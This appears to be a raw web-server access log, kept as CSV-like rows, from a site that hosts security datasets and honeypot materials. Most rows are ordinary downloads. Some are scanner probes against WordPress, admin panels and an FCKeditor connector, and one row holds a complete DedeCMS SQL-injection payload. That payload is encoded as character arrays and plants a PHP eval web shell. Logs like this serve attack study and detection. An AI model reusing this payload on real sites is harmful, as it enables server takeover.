38,1,404,0,GET /access.log.2015-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-29.gz HTTP/1.1
41,1,404,0,GET /admin/javascripts/window.js HTTP/1.1
65,2,404,0,GET /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-06.gz HTTP/1.1
51,1,404,1,GET /honeypot/Honeypot%2520-%2520Howto.pdf HTTP/1.1
25,1,200,0,GET /favicon.ico HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2017-01-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-21.gz HTTP/1.1
34,1,404,0,GET //wordpress/index.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-16.gz HTTP/1.1
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-21.gz HTTP/1.1
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.1
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.0
38,1,404,0,GET /access.log.2015-02-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-20.gz HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-02.gz HTTP/1.1
38,1,200,0,GET /maccdc2012/tunnel.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-25.gz HTTP/1.1
21,1,404,0,GET /geo.gif HTTP/1.1
22,1,404,0,GET /atom.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-10.gz HTTP/1.1
24,1,405,0,PUT /vrqkcp.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-02.gz HTTP/1.1
2017,173,418,0,GET //plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=53&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=119&arrs2[]=119&arrs2[]=119&arrs2[]=46&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-03.gz HTTP/1.1
30,1,404,0,GET /img/flags/ro.gif HTTP/1.1
38,1,404,0,GET /access.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-20.gz HTTP/1.1
24,1,405,0,PUT /fwybji.txt HTTP/1.1
36,1,200,0,GET /maccdc2012/smtp.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/smtp.log.gz HTTP/1.0
37,1,200,0,HEAD /maccdc2012/http.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-09.gz HTTP/1.1
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-03.gz HTTP/1.1
23,1,404,0,GET /blog/feed HTTP/1.1
38,1,404,0,GET /access.log.2015-02-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-10.gz HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2015-12-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-31.gz HTTP/1.1
37,1,404,0,GET /administrator/index.php HTTP/1.0
37,1,200,0,GET /Security-Data-Analysis/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-28.gz HTTP/1.1
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-07.gz HTTP/1.1
28,1,301,0,GET /xmlrpc.php?rsd HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-09.gz HTTP/1.1
23,1,404,0,GET /index.xml HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-04.gz HTTP/1.1
54,1,404,0,GET /bootstrap/img/apple-touch-icon-72x72.png HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2017-02-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-13.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-03.gz HTTP/1.1
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-31.gz HTTP/1.1
53,1,301,1,GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.0
53,1,404,1,GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1
45,1,404,1,GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0
45,1,418,1,GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-23.gz HTTP/1.1
53,1,404,0,GET /resources/images/bg-radial-gradient.gif HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-09.gz HTTP/1.1
54,1,404,0,GET /theme/js/contextMenu/prettify/lang-hs.js HTTP/1.1
36,1,200,0,HEAD /maccdc2012/ssh.log.gz HTTP/1.1
38,1,200,0,GET /maccdc2012/tunnel.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1
36,1,304,0,GET /maccdc2012/conn.log.gz HTTP/1.1
26,1,404,0,GET /wp-login.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-06.gz HTTP/1.1
22,1,200,0,GET /tg/c.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-11.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-23.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-23.gz HTTP/1.1
26,1,404,0,GET /indexold.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-10.gz HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-01-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-05.gz HTTP/1.1
27,1,301,0,HEAD /wp-login.php HTTP/1.1
42,1,404,0,GET /apple-touch-icon-120x120.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-22.gz HTTP/1.1
24,1,200,0,GET /pe_static/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-29.gz HTTP/1.1
165,4,404,0,GET /shop//fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F&uuid=14430306259051487038439416 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-23.gz HTTP/1.1
50,2,200,0,GET /?from=singlemessage&isappinstalled=0 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-11.gz HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-19.gz HTTP/1.1
23,1,200,0,HEAD /tg/c.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1
61,1,404,0,GET /includes/design/images/modules/module_flock.png HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-11-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-27.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.0
48,1,301,0,GET /self.logs/access.log.2015-09-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-05.gz HTTP/1.1
35,1,200,0,HEAD /scada/scada_logs.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-01.gz HTTP/1.1
24,1,404,0,GET /viewer.php HTTP/1.1
33,1,404,0,GET /admin/themes/zX.css HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-04.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-17.gz HTTP/1.1
25,1,200,0,GET //robots.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-06.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-07.gz HTTP/1.1
165,4,404,0,GET /shop//fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F&uuid=14430306259051487084876409 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-08.gz HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2015-07-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-16.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-11-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-04.gz HTTP/1.1
